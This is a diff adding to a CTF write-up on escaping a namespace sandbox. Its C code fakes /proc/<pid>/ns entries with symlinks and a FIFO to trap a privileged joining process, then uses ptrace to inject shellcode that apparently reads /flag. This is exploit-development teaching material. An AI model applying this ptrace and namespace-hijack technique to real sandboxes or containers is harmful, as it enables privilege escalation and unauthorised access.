@@ -320,3 +320,110 @@ void change_ns(pid_t sandbox, unsigned int sandbox_idx) {
 So why is this not the most elegant way? Well, it just iterate over files in /proc/<$sandboxed_process_id>/ns/* files. And it starts with user, then mount namespace. And at this point, the joining process is in the same mount namespace as the init and it cloned child process. And as cloned child has CAP_SYS_ADMIN capability it can 
 can substitude files inside /proc/<$sandboxed_process_id>/ns/* with symlinks from to self /proc/<$sandboxed_process_cloned_child_id>/ns/*.
 
+```c
+// init.c – child
+
+// this function is almost one by one copied from orginal writeup
+int make_run_elf_join_child_pid_namespace(int parent_pid, int child_pid)
+{
+    char path[PATH_MAX];
+    char path2[PATH_MAX];
+
+    mkdir("/tmp/oldproc", 0777);
+    if (mount("/proc", "/tmp/oldproc", NULL, MS_BIND | MS_REC, NULL) == -1)
+    {
+        perror_wrapper("[!][child] mount failed");
+        return -1;
+    }
+
+    mkdir("/tmp/newproc", 0777);
+    if (mount("/tmp/newproc", "/proc", "proc", MS_BIND | MS_REC, NULL) == -1)
+    {
+        perror_wrapper("[!][child] mount failed");
+        return -1;
+    }
+
+    sprintf(path, "/tmp/newproc/%d", parent_pid);
+    mkdir(path, 0777);
+    sprintf(path, "/tmp/newproc/%d/ns", parent_pid);
+    mkdir(path, 0777);
+
+    sprintf(path, "/tmp/newproc/%d/ns/pid", parent_pid);
+    sprintf(path2, "/tmp/oldproc/%d/ns/pid", child_pid);
+    if (symlink(path2, path) == -1)
+    {
+        perror_wrapper("[!][child] symlink failed");
+        return -1;
+    }
+
+    /* Create fifo, so that process blocks when trying to change uts namespace. */
+    sprintf(path, "/tmp/newproc/%d/ns/uts", parent_pid);
+    if (mkfifo(path, 0777) == -1)
+    {
+        perror_wrapper("[!][child] mkfifo failed");
+        return -1;
+    }
+}
+```
+
+The author of https://blog.perfect.blue/namespaces-35c3ctf camed up with a nice idea of not having to win a race with the process. It made it stop on /proc/<$pid>/ns/uts by making it a fifo.
+
+## Ptrace + shellcode
+So we managed to trick joining process into joining a pid namespace of our process with CAP_SYS_PTRACE capability. All we have to do is just takeover the joining process. This can be done easly by attaching to joining process and injecting shellcode into it:
+
+```c
+
+char shellcode[] = "\xeb\x34\x5f\x48\x31\xf6\xb8\x02\x00\x00\x00\x0f\x05\x48\x89\xc7\x48\x89\xe6\xba\x20\x00\x00\x00"
+                   "\x48\x31\xc0\x0f\x05\x48\x89\xc2\xbf\x01\x00\x00\x00\xb8\x01\x00\x00\x00\x0f\x05\xb8\x3c\x00\x00"
+                   "\x00\x48\x31\xff\x0f\x05\xe8\xc7\xff\xff\xff\x2f\x66\x6c\x61\x67\x00";
+
+
+void put_data(char *dst, char *src, size_t len, pid_t tracee)
+{
+    size_t i, mod;
+    union u {
+        int i;
+        char chars[4];
+    } u;
+
+    for (i = 0; i < len; i += 4)
+    {
+        memcpy(u.chars, src + i, 4);
+        if (ptrace(PTRACE_POKEDATA, tracee, dst + i, u.i))
+        {
+            perror("[!] ptrace failed");
+            return;
+        }
+    }
+
+    mod = i % 4;
+    if (mod)
+    {
+        memcpy(u.chars, src + i + mod - 4, 4);
+        if (ptrace(PTRACE_POKEDATA, tracee, dst + i + 4 - mod, u.i))
+        {
+            perror("[!] ptrace failed");
+            return;
+        }
+    }
+}
+
+int takeover_escalator_process(pid_t escalator_pid)
+{
+    struct user_regs_struct regs;
+
+    /* Wait for escalator process to join pid namespace. No need to win the race as a process will block on opening 
+    the pipe. */
+    while (ptrace(PTRACE_ATTACH, escalator_pid, NULL, NULL) == -1)
+    {
+        sleep(1);
+    }
+
+    waitpid(escalator_pid, NULL, 0);
+
+    /* Retrieve rip to inject shellcode. */
+    ptrace(PTRACE_GETREGS, escalator_pid, NULL, &regs);
+    put_data((char*) regs.rip, shellcode, sizeof(shellcode), escalator_pid);
+    ptrace(PTRACE_DETACH, escalator_pid, NULL, NULL);
+}
+```
